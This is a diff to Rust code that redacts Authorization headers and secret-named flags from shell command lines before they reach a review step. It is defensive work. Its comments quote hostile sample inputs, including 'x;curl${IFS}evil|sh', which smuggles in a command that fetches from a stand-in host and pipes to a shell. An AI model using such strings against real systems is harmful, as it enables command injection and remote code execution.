@@ -18,7 +18,9 @@
 //! Not covered, and sent as written: a secret in a header other than
 //! `Authorization` (`X-Api-Key: …`), `curl -u user:password`, the word
 //! after a flag named for authorization rather than a secret
-//! (`--authorization v`), and a quoted value of several words.
+//! (`--authorization v`), a header inside a JSON array or object
+//! (`'["-H","Authorization: Bearer abc"]'`), and all but the first word of
+//! a quoted value of several words (`--token "a b"` sends `b`).
 
 use crate::sweep::judge::secrets::{REDACTED, is_secret_name, without_secrets};
 
@@ -27,8 +29,11 @@ use crate::sweep::judge::secrets::{REDACTED, is_secret_name, without_secrets};
 enum Next {
     /// Nothing.
     Word,
-    /// It is the value of a flag or header named for a secret.
+    /// It is the value of a flag or assignment named for a secret.
     Value,
+    /// It is the value of an `Authorization` header, or its scheme
+    /// (`Bearer`), inside the quotes the header opened.
+    HeaderValue,
 }
 
 /// `line` with the secrets in it taken out, as `REDACTED`:
@@ -86,28 +91,20 @@ fn redacted_word(word: &str, next: &mut Next) -> String {
     let (before, after) = (&word[..at], &word[at + core.len()..]);
     let asked = std::mem::replace(next, Next::Word);
     let lower = core.to_ascii_lowercase();
-    // A header's value goes on only inside the quotes it opened
-    // (`"Authorization: Bearer x"`): a word after the closing quote, or
-    // after a bare `Authorization:`, is another argument, such as the
-    // address a download comes from, and is sent as written.
-    let header_open = !before.is_empty() && after.is_empty();
-    let core = if (asked == Next::Value && is_auth_scheme(&lower))
-        || (lower.ends_with("authorization:") && header_open)
-    {
+    let core = if asked == Next::HeaderValue && is_auth_scheme(&lower) {
+        // `Bearer"` closes the header: what follows is another argument.
         if after.is_empty() {
-            *next = Next::Value;
+            *next = Next::HeaderValue;
         }
         core.to_string()
-    } else if asked == Next::Value {
+    } else if asked != Next::Word {
         value(core).to_string()
-    } else if let Some((header, rest)) = lower
-        .split_once("authorization:")
-        .filter(|(_, rest)| !rest.is_empty())
-    {
-        let name_end = header.len() + "authorization:".len();
-        if is_auth_scheme(rest) {
-            if header_open {
-                *next = Next::Value;
+    } else if let Some(at) = lower.find(HEADER) {
+        let name_end = at + HEADER.len();
+        let rest = &lower[name_end..];
+        if rest.is_empty() || is_auth_scheme(rest) {
+            if is_header_open(word) {
+                *next = Next::HeaderValue;
             }
             core.to_string()
         } else {
@@ -115,7 +112,7 @@ fn redacted_word(word: &str, next: &mut Next) -> String {
         }
     } else {
         let core = without_login(core);
-        if core.starts_with('-') && !core.contains('=') && is_secret_name(&core) {
+        if core.starts_with('-') && !core.contains('=') && is_secret_named(&core) {
             *next = Next::Value;
             core
         } else {
@@ -125,6 +122,44 @@ fn redacted_word(word: &str, next: &mut Next) -> String {
     format!("{before}{core}{after}")
 }
 
+/// The header whose value is taken out, in lower case.
+const HEADER: &str = "authorization:";
+
+/// Whether the header in `word` goes on in the next word: it is inside
+/// quotes that open before it (`"Authorization:`, `--header="Authorization:`,
+/// `-H"Authorization:`) and do not close after it. A word after the closing
+/// quote, or after a bare `Authorization:`, is another argument, such as
+/// the address a download comes from, and is sent as written.
+fn is_header_open(word: &str) -> bool {
+    let is_quote = |c: char| matches!(c, '"' | '\'');
+    let Some(at) = word.to_ascii_lowercase().find(HEADER) else {
+        return false;
+    };
+    word[..at].chars().filter(|&c| is_quote(c)).count() % 2 == 1 && !word[at..].contains(is_quote)
+}
+
+/// Whether the flag or name `name` holds a secret: the last part of it is a
+/// secret word (`--api-key`, `--authToken`, `GITHUB_TOKEN`). A part before
+/// it says what the value is for, not that it is one: `--auth-command`,
+/// `--token-file` and `--password-stdin` take a program, a file or nothing,
+/// which the review must see. The review's own removal (`is_secret_name`)
+/// counts any part, for the assignments of start-up files.
+fn is_secret_named(name: &str) -> bool {
+    let word = name
+        .rsplit(|c: char| !c.is_ascii_alphanumeric())
+        .next()
+        .unwrap_or(name);
+    let bytes = word.as_bytes();
+    let start = (1..bytes.len())
+        .rev()
+        .find(|&i| {
+            bytes[i].is_ascii_uppercase()
+                && (bytes[i - 1].is_ascii_lowercase() || bytes[i - 1].is_ascii_digit())
+        })
+        .unwrap_or(0);
+    is_secret_name(&word[start..])
+}
+
 /// Whether `lower` is the scheme of an `Authorization` header, which says
 /// what kind the value after it is (`Bearer x`, `token x`).
 fn is_auth_scheme(lower: &str) -> bool {
@@ -132,7 +167,8 @@ fn is_auth_scheme(lower: &str) -> bool {
 }
 
 /// Whether `word` can be nothing but a value: token characters only
-/// (letters, digits and `._~%+=:-`), and not a path or an expansion.
+/// (letters, digits and `._~%+=:-`), and not a path, an expansion or a
+/// flag (`--token --package=evil-pkg`).
 /// Anything with a shell character in it (`x;curl${IFS}evil|sh`) may be
 /// code, and taking it out would hide it from the review. `/` is no token
 /// character, so an address or a path (`--auth-url https://…`,
@@ -140,7 +176,7 @@ fn is_auth_scheme(lower: &str) -> bool {
 /// `/` in it is then sent too, the lesser harm next to hiding what runs.
 fn is_token_shaped(word: &str) -> bool {
     !word.is_empty()
-        && !word.starts_with(['~', '.'])
+        && !word.starts_with(['~', '.', '-'])
         && word
             .chars()
             .all(|c| c.is_ascii_alphanumeric() || "._~%+=:-".contains(c))
@@ -166,7 +202,7 @@ fn without_assigned_secret(word: &str) -> Option<String> {
         if value_start > word.len() {
             break;
         }
-        if is_secret_name(part) {
+        if is_secret_named(part) {
             return Some(format!(
                 "{}={}",
                 &word[..value_start - 1],
